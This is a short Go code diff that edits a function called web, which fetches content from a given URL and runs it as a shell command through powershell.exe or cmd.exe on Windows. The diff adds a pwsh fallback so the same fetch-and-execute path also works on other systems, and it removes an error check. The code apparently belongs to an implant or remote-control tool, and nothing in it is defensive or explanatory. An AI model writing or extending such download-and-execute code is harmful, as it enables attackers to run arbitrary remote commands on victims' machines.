@@ -134,15 +134,10 @@ func write(w io.Writer, s []string) error {
 }
 func web(x context.Context, u string) error {
 	var (
-		i      *http.Response
-		q, c   = context.WithTimeout(x, timeout*5)
-		r, err = http.NewRequestWithContext(q, http.MethodGet, u, nil)
+		q, c = context.WithTimeout(x, timeout*5)
+		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
 	)
-	if err != nil {
-		c()
-		return err
-	}
-	i, err = client.Do(r)
+	i, err := client.Do(r)
 	if c(); err != nil {
 		return err
 	}
@@ -155,6 +150,7 @@ func web(x context.Context, u string) error {
 		if device.OS == device.Windows {
 			return file("powershell.exe", "-Comm", string(b))
 		}
+		return file("pwsh", "-Comm", string(b))
 	case "cmd", "execute", "script", "application/cmd", "application/script":
 		if device.OS == device.Windows {
 			return file("cmd.exe", "/c", string(b))
